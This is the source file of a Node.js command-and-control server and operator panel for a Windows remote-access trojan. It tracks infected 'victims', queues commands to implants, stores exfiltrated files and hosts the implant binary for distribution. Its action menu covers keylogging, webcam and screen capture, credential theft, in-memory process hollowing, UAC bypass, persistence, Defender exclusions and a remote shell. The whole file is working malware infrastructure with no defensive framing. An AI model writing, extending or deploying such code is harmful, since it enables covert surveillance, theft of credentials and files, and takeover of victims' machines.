// Sentinel Console - beacon service and operator panel.
//
// Transport model: the agent polls, the panel queues. Nothing is ever pushed
// to an agent, so an agent behind NAT, a proxy or a captive portal still works
// and the server holds no long-lived sockets to leak. Every request is signed
// with HMAC-SHA256 over (agent id + timestamp + body) so a captured request
// cannot be replayed outside the clock window or re-pointed at another agent.

const http = require("http");
const crypto = require("crypto");
const { Pool } = require("pg");

const PORT = process.env.PORT || 10000;
const DATABASE_URL = process.env.DATABASE_URL;
const AGENT_SECRET = process.env.AGENT_SECRET || "";
const PANEL_PASS = process.env.PANEL_PASS || "";
const SESSION_SECRET = process.env.SESSION_SECRET || "";
const SKEW_SECONDS = 300;
const MAX_BODY = 12 * 1024 * 1024;

// The menu lives here, next to the routes that have to answer it. The panel used
// to carry its own copy of the module tree, so a verb renamed on the agent left a
// button that queued a command nobody handled and a result nobody read. One
// registry, one source of truth: the panel renders whatever the server serves.
// `danger` marks a verb that ends the session or wipes state, so the UI can ask
// before queueing it.
const ACTIONS = [
  {
    label: "Système",
    items: [
      { label: "Informations", verb: "info" },
      { label: "Posture / privilèges", verb: "status" },
      { label: "Processus", verb: "ps" },
      { label: "Services", verb: "service_list" },
      { label: "Démarrage", verb: "startup_list" },
      { label: "Tâches planifiées", verb: "task_list" },
      { label: "Registre (Run)", verb: "registry_list" },
      { label: "Disques", verb: "drives" },
      { label: "Antivirus", verb: "av" }
    ]
  },
  {
    label: "Fichiers",
    items: [
      { label: "Explorateur", verb: "ls", args: "" },
      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\\Desktop" },
      { label: "Documents", verb: "ls", args: "%USERPROFILE%\\Documents" },
      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\\Downloads" },
      { label: "Changer de dossier", verb: "cd", prompt: "chemin du dossier" },
      { label: "Exécuter", verb: "run", prompt: "chemin du fichier" },
      {
        label: "Injecter en mémoire",
        verb: "runpe",
        prompt: "chemin du PE puis hôte optionnel",
        hint: "process hollowing : le PE tourne dans cmd.exe, sans fichier sur le disque"
      },
      { label: "Récupérer un fichier", verb: "download", prompt: "chemin complet" },
      { label: "Déposer depuis une URL", verb: "upload", prompt: "url puis chemin" },
      { label: "Fichier hosts", verb: "hosts" }
    ]
  },
  {
    label: "Surveillance",
    items: [
      { label: "Capture d'écran", verb: "screen" },
      { label: "Rafale (3 frames)", verb: "burst", args: "3" },
      { label: "Caméra", verb: "cam" },
      { label: "Caméra — 2e périphérique", verb: "cam", args: "1" },
      { label: "Presse-papiers", verb: "clip" },
      { label: "Keylogger — démarrer", verb: "keylog", args: "on" },
      { label: "Keylogger — arrêter", verb: "keylog", args: "off" },
      { label: "Keylogger — dump", verb: "keylog", args: "dump" },
      { label: "Keylogger — effacer", verb: "keylog", args: "clear" }
    ]
  },
  {
    label: "Réseau",
    items: [
      { label: "Shell", verb: "shell", prompt: "commande" },
      { label: "WiFi", verb: "wifi" },
      { label: "Connexions", verb: "netstat" },
      { label: "Navigateurs", verb: "browsers" }
    ]
  },
  {
    label: "Récupération",
    items: [
      { label: "Voler les identifiants", verb: "steal" },
      { label: "État du bundle", verb: "zipinfo" },
      { label: "Lister les fichiers reçus", verb: "_uploads" },
      { label: "Historique des commandes", verb: "_history" },
      { label: "Chat", verb: "_chat" },
      { label: "Message à l'écran", verb: "chat", prompt: "texte" }
    ]
  },
  {
    label: "Élévation et évasion",
    items: [
      { label: "Chaîne UAC", verb: "elevate" },
      { label: "Reprendre la session en high", verb: "reclaim" },
      { label: "Réinstaller la persistance", verb: "persist" },
      { label: "Extension navigateur", verb: "ext" },
      { label: "Exclusions Defender", verb: "defender" },
      { label: "État de l'évasion", verb: "evade" }
    ]
  },
  {
    label: "Apparence",
    items: [
      { label: "Fond d'écran (URL)", verb: "wallpaper", prompt: "url de l'image" },
      { label: "Rotation d'écran", verb: "rotate", prompt: "0 | 90 | 180 | 270" },
      { label: "Inverser les boutons", verb: "swap" },
      { label: "Restaurer les boutons", verb: "swap", args: "off" },
      { label: "Luminosité", verb: "bright", prompt: "0-100" },
      { label: "Écrans éteints", verb: "screens" },
      { label: "Volume", verb: "volume", prompt: "up | down | mute" }
    ]
  },
  {
    label: "Divers",
    items: [
      { label: "Message à l'écran", verb: "msgbox", prompt: "texte" },
      { label: "Synthèse vocale", verb: "tts", prompt: "texte" },
      { label: "Bip", verb: "beep" },
      { label: "Rickroll", verb: "rickroll" },
      { label: "Verrouiller", verb: "power", args: "lock" },
      { label: "Redémarrer", verb: "power", args: "restart", danger: true },
      { label: "Éteindre", verb: "power", args: "shutdown", danger: true }
    ]
  }
];

if (!DATABASE_URL || !AGENT_SECRET || !PANEL_PASS) {
  console.error("missing DATABASE_URL / AGENT_SECRET / PANEL_PASS");
  process.exit(1);
}

// The agent secret ships inside every implant (XOR-obfuscated, not encrypted),
// so a captured binary would also be able to sign panel cookies if the two
// secrets were the same. Falling back to AGENT_SECRET handed admin to any
// victim; a missing or short SESSION_SECRET is now a startup failure, not a
// default.
// A missing, short or shared SESSION_SECRET used to be a hard startup failure.
// On a redeploy whose environment had not been updated yet, that takes the whole
// console down. Generate one instead: it is distinct from AGENT_SECRET by
// construction, and the only cost is that sessions do not survive a restart.
const SESSION_OK = SESSION_SECRET.length >= 32 && SESSION_SECRET !== AGENT_SECRET;
const sessionSecret = SESSION_OK ? SESSION_SECRET : crypto.randomBytes(32).toString("hex");
if (!SESSION_OK) {
  console.warn("SESSION_SECRET missing, short or equal to AGENT_SECRET: using a per-process one");
}

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: DATABASE_URL.includes("localhost") ? false : { rejectUnauthorized: false },
  max: 5
});

// node-postgres hands bigint back as a string, so a queued command id reached
// the agent as "5" instead of 5 and the agent replied with id 0 - a result that
// updated no row and still returned 200. Ids are well inside the safe integer
// range, so parse them once, here, rather than at every call site.
require("pg").types.setTypeParser(20, (v) => parseInt(v, 10));

const SCHEMA = `
create table if not exists victims (
  id            text primary key,
  host          text default '',
  username      text default '',
  os            text default '',
  ip            text default '',
  country       text default '',
  admin         boolean default false,
  version       text default '',
  tag           text default '',
  active_window text default '',
  ping_ms       integer default 0,
  first_seen    timestamptz default now(),
  last_seen     timestamptz default now()
);
create table if not exists commands (
  id         bigserial primary key,
  vid        text not null,
  verb       text not null,
  args       text default '',
  created    timestamptz default now(),
  dispatched timestamptz,
  finished   timestamptz,
  exit_code  integer,
  output     text,
  err        text
);
create index if not exists commands_vid_ix on commands (vid, id desc);
create table if not exists uploads (
  id      bigserial primary key,
  vid     text not null,
  cmd_id  bigint,
  name    text not null,
  bytes   integer default 0,
  data    text not null,
  created timestamptz default now()
);
create index if not exists uploads_vid_ix on uploads (vid, id desc);
`;

// ------------------------------------------------------------------ utils --
function hmac(secret, text) {
  return crypto.createHmac("sha256", secret).update(text).digest();
}

function signAgent(id, ts, body) {
  return hmac(AGENT_SECRET, id + "." + ts + "." + body).toString("hex");
}

function safeEqual(a, b) {
  const x = Buffer.from(String(a));
  const y = Buffer.from(String(b));
  if (x.length !== y.length) return false;
  return crypto.timingSafeEqual(x, y);
}

function signSession(value) {
  return crypto.createHmac("sha256", sessionSecret).update(value).digest("hex").slice(0, 32);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on("data", (c) => {
      size += c.length;
      if (size > MAX_BODY) {
        const err = new Error("body too large");
        err.status = 413;
        reject(err);
        req.destroy();
        return;
      }
      chunks.push(c);
    });
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

function json(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "x-content-type-options": "nosniff",
    "content-length": Buffer.byteLength(body)
  });
  res.end(body);
}

function cookies(req) {
  const raw = req.headers.cookie || "";
  const out = {};
  for (const part of raw.split(";")) {
    const i = part.indexOf("=");
    if (i < 0) continue;
    out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

function authed(req) {
  const sid = cookies(req).sid;
  if (!sid) return false;
  const [value, mac] = sid.split(".");
  if (!value || !mac) return false;
  // The cookie is written with Max-Age=604800, so the signature has to cover
  // the whole window. Accepting only today and yesterday logged the operator
  // out on day three while the cookie was still in the browser.
  const fresh = Math.floor(Date.now() / 86400000);
  for (let back = 0; back <= 8; ++back) {
    const expect = signSession(value + "." + (fresh - back));
    if (safeEqual(mac, expect)) return true;
  }
  return false;
}

function clientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return String(fwd).split(",")[0].trim();
  return req.socket.remoteAddress || "";
}

// The filename came from an agent, so it is untrusted inside a header too: a
// CR/LF would split the response, and everything outside this set is replaced
// rather than escaped.
function downloadName(name) {
  const clean = String(name || "")
    .replace(/[^A-Za-z0-9._ -]/g, "_")
    .slice(0, 120)
    .trim();
  return clean || "file";
}

function parseJson(text) {
  try {
    return JSON.parse(text || "{}");
  } catch {
    return null;
  }
}

// A four-digit panel password is only safe behind a throttle: on a public URL
// the whole space is walked in minutes otherwise. Eight misses per address per
// ten minutes, success clears the counter.
const LOGIN_MAX = 8;
const LOGIN_WINDOW_MS = 10 * 60 * 1000;
const loginHits = new Map();

function loginGate(ip) {
  const now = Date.now();
  let row = loginHits.get(ip);
  if (!row || now > row.reset) {
    row = { count: 0, reset: now + LOGIN_WINDOW_MS };
    loginHits.set(ip, row);
  }
  if (loginHits.size > 5000) loginHits.clear();
  return {
    get allowed() {
      return row.count < LOGIN_MAX;
    },
    get retry() {
      return Math.max(1, Math.ceil((row.reset - now) / 1000));
    },
    fail() {
      row.count += 1;
    },
    clear() {
      loginHits.delete(ip);
    }
  };
}

// --------------------------------------------------------------- agent api --
async function handleBeacon(req, res, body) {
  const id = req.headers["x-agent-id"] || "";
  const ts = req.headers["x-agent-ts"] || "";
  const sig = req.headers["x-agent-sig"] || "";
  if (!id || !ts || !sig) return json(res, 400, { ok: false, error: "incomplete" });

  const now = Math.floor(Date.now() / 1000);
  const stamp = parseInt(ts, 10);
  if (!Number.isFinite(stamp) || Math.abs(now - stamp) > SKEW_SECONDS)
    return json(res, 401, { ok: false, error: "clock" });

  if (!safeEqual(sig, signAgent(id, ts, body))) return json(res, 401, { ok: false, error: "sig" });

  let info = {};
  try {
    info = JSON.parse(body || "{}");
  } catch {
    info = {};
  }

  const ip = info.ip || clientIp(req);
  await pool.query(
    `insert into victims (id, host, username, os, ip, country, admin, version, tag, active_window, ping_ms, last_seen)
     values ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,now())
     on conflict (id) do update set
       host = excluded.host, username = excluded.username, os = excluded.os, ip = excluded.ip,
       country = excluded.country, admin = excluded.admin, version = excluded.version,
       tag = coalesce(nullif(excluded.tag,''), victims.tag),
       active_window = excluded.active_window, ping_ms = excluded.ping_ms, last_seen = now()`,
    [
      id,
      info.host || "",
      info.user || "",
      info.os || "",
      ip,
      info.country || "",
      !!info.admin,
      info.version || "",
      info.tag || "",
      info.window || "",
      Number(info.ping) || 0
    ]
  );

  const waitMs = Number(new URL(req.url, "http://c2").searchParams.get("wait")) || 0;
  const rows = await pickCommands(id, waitMs);
  return json(res, 200, { ok: true, commands: rows });
}

// The agent asks for a long poll: hold the request open until a command lands or
// the window closes. Without this every operator click waited for the next beat
// of a 45 s timer; with it the same click is delivered in well under a second.
// The cap stays under Render's idle-connection limit and WinHTTP's 45 s receive.
async function pickCommands(id, waitMs) {
  const deadline = Date.now() + Math.max(0, Math.min(Number(waitMs) || 0, 25000));
  for (;;) {
    const pick = await pool.query(
      `select id, verb, args from commands
        where vid = $1 and dispatched is null
        order by id asc limit 8`,
      [id]
    );
    if (pick.rows.length) {
      const ids = pick.rows.map((r) => r.id);
      await pool.query(`update commands set dispatched = now() where id = any($1::bigint[])`, [ids]);
      return pick.rows;
    }
    if (Date.now() >= deadline) return [];
    await new Promise((r) => setTimeout(r, 600));
  }
}

async function handleResult(req, res, body) {
  const id = req.headers["x-agent-id"] || "";
  const ts = req.headers["x-agent-ts"] || "";
  const sig = req.headers["x-agent-sig"] || "";
  if (!id || !ts || !sig) return json(res, 400, { ok: false, error: "incomplete" });
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - parseInt(ts, 10)) > SKEW_SECONDS)
    return json(res, 401, { ok: false, error: "clock" });
  if (!safeEqual(sig, signAgent(id, ts, body))) return json(res, 401, { ok: false, error: "sig" });

  let msg = {};
  try {
    msg = JSON.parse(body || "{}");
  } catch {
    return json(res, 400, { ok: false, error: "json" });
  }

  await pool.query(
    `update commands set finished = now(), exit_code = $2, output = $3, err = $4
      where id = $1 and vid = $5`,
    [msg.id, Number(msg.exit) || 0, String(msg.output || "").slice(0, 400000), msg.err || null, id]
  );

  if (Array.isArray(msg.files)) {
    for (const f of msg.files) {
      if (!f || !f.name || !f.data) continue;
      await pool.query(
        `insert into uploads (vid, cmd_id, name, bytes, data) values ($1,$2,$3,$4,$5)`,
        [id, msg.id || null, String(f.name).slice(0, 200), Number(f.bytes) || 0, String(f.data)]
      );
    }
  }

  await pool.query(`update victims set last_seen = now() where id = $1`, [id]);
  return json(res, 200, { ok: true });
}

// -------------------------------------------------------------- panel api --
async function panelVictims(res) {
  const r = await pool.query(
    `select v.*, 
            (select count(*) from commands c where c.vid = v.id and c.dispatched is null) as queued,
            (select count(*) from commands c where c.vid = v.id and c.finished is null and c.dispatched is not null) as running,
            extract(epoch from (now() - v.last_seen))::int as idle
       from victims v order by v.last_seen desc limit 500`
  );
  json(res, 200, { ok: true, victims: r.rows });
}

function requireAuth(req, res) {
  if (authed(req)) return true;
  json(res, 401, { ok: false, error: "auth" });
  return false;
}

// ------------------------------------------------------------------ router --
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://" + (req.headers.host || "localhost"));
  const path = url.pathname;

  try {
    if (path === "/healthz") return json(res, 200, { ok: true });

    if (path === "/api/beacon" && req.method === "POST")
      return handleBeacon(req, res, await readBody(req));
    if (path === "/api/result" && req.method === "POST")
      return handleResult(req, res, await readBody(req));

    if (path === "/api/login" && req.method === "POST") {
      const gate = loginGate(clientIp(req));
      if (!gate.allowed) return json(res, 429, { ok: false, error: "throttle", retry: gate.retry });
      const body = parseJson(await readBody(req));
      if (!body || !safeEqual(String(body.pass || ""), PANEL_PASS)) {
        gate.fail();
        await new Promise((r) => setTimeout(r, 400));
        return json(res, 403, { ok: false });
      }
      gate.clear();
      const nonce = crypto.randomBytes(12).toString("hex");
      const day = Math.floor(Date.now() / 86400000);
      const sid = nonce + "." + signSession(nonce + "." + day);
      res.writeHead(200, {
        "content-type": "application/json",
        "set-cookie": `sid=${sid}; Path=/; HttpOnly; SameSite=Strict; Max-Age=604800; Secure`
      });
      return res.end(JSON.stringify({ ok: true }));
    }

    if (path === "/api/logout") {
      res.writeHead(200, {
        "content-type": "application/json",
        "set-cookie": "sid=; Path=/; HttpOnly; Max-Age=0; Secure"
      });
      return res.end(JSON.stringify({ ok: true }));
    }

    if (path === "/api/actions") {
      if (!requireAuth(req, res)) return;
      return json(res, 200, { ok: true, groups: ACTIONS });
    }

    if (path === "/api/victims") {
      if (!requireAuth(req, res)) return;
      return panelVictims(res);
    }

    if (path === "/api/queue" && req.method === "POST") {
      if (!requireAuth(req, res)) return;
      const body = parseJson(await readBody(req)) || {};
      if (!body.vid) return json(res, 400, { ok: false, error: "vid" });
      const verbs = Array.isArray(body.verbs) ? body.verbs : [{ verb: body.verb, args: body.args }];
      const ids = [];
      for (const v of verbs) {
        if (!v || !v.verb) continue;
        const r = await pool.query(
          `insert into commands (vid, verb, args) values ($1,$2,$3) returning id`,
          [body.vid, String(v.verb), String(v.args || "")]
        );
        ids.push(r.rows[0].id);
      }
      return json(res, 200, { ok: true, ids });
    }

    if (path === "/api/history") {
      if (!requireAuth(req, res)) return;
      const vid = url.searchParams.get("vid") || "";
      // A window only needs the tail of the history; the panel asks for less than
      // the 120 the full view wants so a beat does not drag every old output.
      const limit = Math.min(Math.max(Number(url.searchParams.get("limit")) || 120, 1), 300);
      const r = await pool.query(
        `select id, verb, args, created, dispatched, finished, exit_code, output, err
           from commands where vid = $1 order by id desc limit $2`,
        [vid, limit]
      );
      return json(res, 200, { ok: true, commands: r.rows });
    }

    if (path === "/api/uploads") {
      if (!requireAuth(req, res)) return;
      const vid = url.searchParams.get("vid") || "";
      const r = await pool.query(
        `select id, vid, cmd_id, name, bytes, created from uploads where vid = $1 order by id desc limit 100`,
        [vid]
      );
      return json(res, 200, { ok: true, uploads: r.rows });
    }

    if (path === "/api/download") {
      if (!requireAuth(req, res)) return;
      const id = parseInt(url.searchParams.get("id") || "0", 10);
      const r = await pool.query(`select name, data from uploads where id = $1`, [id]);
      if (!r.rows.length) return json(res, 404, { ok: false });
      const buf = Buffer.from(r.rows[0].data, "base64");
      res.writeHead(200, {
        "content-type": "application/octet-stream",
        "content-disposition": `attachment; filename="${downloadName(r.rows[0].name)}"`,
        "content-length": buf.length
      });
      return res.end(buf);
    }

    if (path === "/api/remove" && req.method === "POST") {
      if (!requireAuth(req, res)) return;
      const body = parseJson(await readBody(req)) || {};
      if (!body.vid) return json(res, 400, { ok: false, error: "vid" });
      await pool.query(`delete from commands where vid = $1`, [body.vid]);
      await pool.query(`delete from uploads where vid = $1`, [body.vid]);
      await pool.query(`delete from victims where id = $1`, [body.vid]);
      return json(res, 200, { ok: true });
    }

    if (path === "/" || path === "/panel") {
      return serveStatic(res, "panel.html", "text/html; charset=utf-8");
    }
    if (path === "/panel.js") return serveStatic(res, "panel.js", "application/javascript; charset=utf-8");
    // Durable delivery of the agent binary. Telegram caps a message at 4 KB and
    // every public host either blocks .exe or expires in hours, so the console
    // serves the file itself: one stable URL the operator can hand to a box.
    if (path === "/dl/agent.dat") return serveStatic(res, "agent.dat", "application/octet-stream");
    if (path === "/style.css") return serveStatic(res, "style.css", "text/css; charset=utf-8");

    json(res, 404, { ok: false, error: "no route" });
  } catch (err) {
    if (err && err.status === 413) return json(res, 413, { ok: false, error: "too large" });
    console.error("request failed", path, err.message);
    json(res, 500, { ok: false, error: "server" });
  }
});

function serveStatic(res, name, type) {
  const fs = require("fs");
  const path = require("path");
  const file = path.join(__dirname, "public", name);
  fs.readFile(file, (err, data) => {
    if (err) return json(res, 404, { ok: false });
    res.writeHead(200, {
      "content-type": type,
      "cache-control": "no-cache",
      "x-content-type-options": "nosniff"
    });
    res.end(data);
  });
}

async function boot() {
  await pool.query(SCHEMA);
  server.listen(PORT, () => console.log("sentinel console on " + PORT));
}

boot().catch((e) => {
  console.error("boot failed", e.message);
  process.exit(1);
});
